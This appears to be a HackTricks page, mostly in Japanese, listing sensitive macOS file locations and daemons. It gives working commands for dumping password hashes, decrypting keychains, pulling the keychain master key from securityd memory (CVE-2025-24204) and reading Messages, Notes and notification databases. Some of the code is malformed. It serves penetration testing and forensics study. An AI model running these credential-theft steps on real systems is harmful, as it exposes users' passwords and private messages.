# macOS の重要な場所と興味深いデーモン

{{#include ../../../banners/hacktricks-training.md}}

## パスワード

### シャドウパスワード

シャドウパスワードはユーザーの設定とともに、**`/var/db/dslocal/nodes/Default/users/`** にある plist に保存されています。\
以下のワンライナーで、**ユーザーに関するすべての情報**（ハッシュ情報を含む）をダンプできます:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) または [**this one**](https://github.com/octomagon/davegrohl.git) はハッシュを**hashcat** **フォーマット**に変換するために使用できます。

非サービスアカウントのすべてのcredsをhashcatフォーマット `-m 7100` (macOS PBKDF2-SHA512) でダンプする代替のワンライナー：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
ユーザーの`ShadowHashData`を取得する別の方法は、`dscl`を使用することです: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

このファイルはシステムが**シングルユーザモード**で実行されているときに**のみ使用されます**（つまり、あまり頻繁ではありません）。

### Keychain Dump

注意: the security binary を使用して **dump the passwords decrypted** する場合、いくつかのプロンプトが表示され、ユーザーにこの操作を許可するよう求められます。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> このコメント [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) に基づくと、これらのツールは Big Sur ではもはや動作していないようです。

### Keychaindump 概要

macOS のキーチェーンからパスワードを抽出するための **keychaindump** というツールが開発されましたが、Big Sur のような新しい macOS バージョンでは制限があり、これは [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) で指摘されています。**keychaindump** を使用するには、攻撃者がアクセスを取得し **root** に権限昇格する必要があります。ツールは、利便性のためにユーザーログイン時にキーチェーンがデフォルトでアンロックされ、アプリケーションがユーザーのパスワードを何度も要求されることなくアクセスできる点を悪用します。ただし、ユーザーが使用後に毎回キーチェーンをロックする設定にしている場合、**keychaindump** は無効になります。

**Keychaindump** は **securityd** と呼ばれる特定のプロセスを標的に動作します。Apple はこれを認可と暗号処理のためのデーモンとして説明しており、キーチェーンにアクセスする上で重要です。抽出プロセスでは、ユーザーのログインパスワードから導出される **Master Key** を特定することが含まれます。このキーはキーチェーンファイルを読み取るために不可欠です。**Master Key** を見つけるために、**keychaindump** は `vmmap` コマンドを使用して **securityd** のメモリヒープをスキャンし、`MALLOC_TINY` とフラグ付けされた領域内の潜在的なキーを探します。これらのメモリ領域を調査するために次のコマンドが使用されます：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
潜在的な master keys を特定した後、**keychaindump** はヒープ内を検索して、マスターキーの候補を示す特定のパターン（`0x0000000000000018`）を探します。実際にこのキーを利用するには、**keychaindump** のソースコードに示されているように、deobfuscation を含む追加の手順が必要です。この領域に注力するアナリストは、キーチェーンを復号するための重要なデータが **securityd** プロセスのメモリ内に格納されていることに注意してください。**keychaindump** を実行する例としては、次のようなコマンドがあります:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、OSX keychain から以下の種類の情報を法医学的に妥当な方法で抽出するために使用できます:

- ハッシュ化された Keychain パスワード（[hashcat](https://hashcat.net/hashcat/) や [John the Ripper](https://www.openwall.com/john/)、でクラッキング可能）
- インターネットパスワード
- 一般的なパスワード
- 秘密鍵
- 公開鍵
- X509 証明書
- セキュアノート
- Appleshare パスワード

Keychain のアンロックパスワード、[volafox](https://github.com/n0fate/volafox) や [volatility](https://github.com/volatilityfoundation/volatility) を使って取得したマスターキー、または SystemKey のようなアンロックファイルがあれば、Chainbreaker はプレーンテキストのパスワードも提供します。

これらのいずれかの方法で Keychain をアンロックできない場合、Chainbreaker は利用可能なその他すべての情報を表示します。

#### **Keychain キーをダンプする**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey を使って keychain keys（passwords を含む）をダンプする**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (パスワード付き) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **memory dumpで keychain keys（パスワード付き）をダンプする**

[Follow these steps](../index.html#dumping-memory-with-osxpmem) を実行して **memory dump** を行ってください
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **ユーザーのパスワードを使用してキーチェーンの鍵（パスワード含む）をダンプする**

ユーザーのパスワードを知っている場合、それを使用して**そのユーザーに属するキーチェーンをダンプおよび復号化する**ことができます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` の entitlement による Keychain マスターキー (CVE-2025-24204)

macOS 15.0 (Sequoia) は `/usr/bin/gcore` を **`com.apple.system-task-ports.read`** entitlement 付きで出荷しました。そのため、ローカルの管理者（または悪意ある署名アプリ）は SIP/TCC が有効でも **任意のプロセスのメモリをダンプ** できます。`securityd` をダンプすると **Keychain マスターキー** が平文で leaks し、ユーザーパスワードなしで `login.keychain-db` を復号できます。

**脆弱なビルド (15.0–15.2) での簡易再現:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

通知データは `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` にあります。

興味深い情報の多くは **blob** に含まれています。したがって、その内容を **抽出** し、**変換** を行って **人間** **が読みやすい** 形式にするか、**`strings`** を使用する必要があります。アクセスするには次のようにします:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Recent privacy issues (NotificationCenter DB)

- macOS **14.7–15.1** では、Apple が `db2/db` の SQLite にバナーの内容を適切にマスキングせずに保存していました。CVE **CVE-2024-44292/44293/40838/54504** により、ローカルユーザは単に DB を開くだけで他のユーザの通知テキストを読み取ることができました（no TCC prompt）。**15.2** で DB を移動／ロックすることで修正されましたが、古いシステムでは上記パスが依然として recent notifications and attachments を leaks します。
- このデータベースは影響を受けたビルド上でのみ world-readable になっているため、legacy endpoints 上で hunting を行う場合は、更新する前に copy して artefacts を保存してください。

### Notes

ユーザの **notes** は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります。
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## 環境設定

macOS のアプリの環境設定は **`$HOME/Library/Preferences`** にあり、iOS では `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` にあります。

macOS では CLI ツール **`defaults`** を使って **環境設定ファイルを変更** できます。

**`/usr/sbin/cfprefsd`** は XPC サービス `com.apple.cfprefsd.daemon` と `com.apple.cfprefsd.agent` を提供しており、環境設定の変更などの処理を実行するために呼び出すことができます。

## OpenDirectory の permissions.plist

ファイル `/System/Library/OpenDirectory/permissions.plist` にはノード属性に適用される権限が含まれており、SIP によって保護されています.\
このファイルは UUID（uid ではなく）で特定のユーザに権限を付与するため、`ShadowHashData`、`HeimdalSRPKey`、`KerberosKeys` などの特定の機密情報へアクセスできるようにします:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## システム通知

### Darwin の通知

通知の主要なデーモンは **`/usr/sbin/notifyd`** です。通知を受け取るには、クライアントは `com.apple.system.notification_center` Mach ポートを通じて登録する必要があります（`sudo lsmp -p <pid notifyd>` で確認できます）。デーモンは `/etc/notify.conf` ファイルで設定できます。

通知に使われる名前は一意のリバースDNS表記であり、通知がそれらのいずれかに送信されると、それを処理できると示したクライアントが受け取ります。

現在の状態をダンプして（全ての名前を確認するために）notifyd プロセスに SIGUSR2 シグナルを送信し、生成されるファイル `/var/run/notifyd_<pid>.status` を読むことで可能です:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center（分散通知センター）

主なバイナリが **`/usr/sbin/distnoted`** である **Distributed Notification Center** は、通知を送る別の方法です。いくつかの XPC サービスを公開しており、クライアントを検証しようとするチェックを行います。

### Apple Push Notifications (APN)（Apple のプッシュ通知）

この場合、アプリケーションは **トピック** を登録できます。クライアントは **`apsd`** を通じて Apple のサーバーに接続し、トークンを生成します。プロバイダ側もトークンを生成しており、Apple のサーバーに接続してクライアントへメッセージを送信できます。これらのメッセージはローカルで **`apsd`** によって受信され、該当するアプリケーションへ通知が中継されます。

設定は `/Library/Preferences/com.apple.apsd.plist` にあります。

メッセージのローカルデータベースは macOS では `/Library/Application\ Support/ApplePushService/aps.db` に、iOS では `/var/mobile/Library/ApplePushService` にあります。テーブルは3つで、`incoming_messages`、`outgoing_messages`、`channel` です。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
また、次の方法を使ってdaemonと接続に関する情報を取得することもできます:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## ユーザー通知

これらはユーザーが画面で見るべき通知です:

- **`CFUserNotification`**: これらの API は、画面上にメッセージを表示するポップアップを出すための手段を提供します。
- **The Bulletin Board**: これは iOS で表示され、消えるバナーで、Notification Center に保存されます。
- **`NSUserNotificationCenter`**: これは MacOS における iOS の bulletin board です。通知を格納するデータベースは `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` にあります。

## 参考文献

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
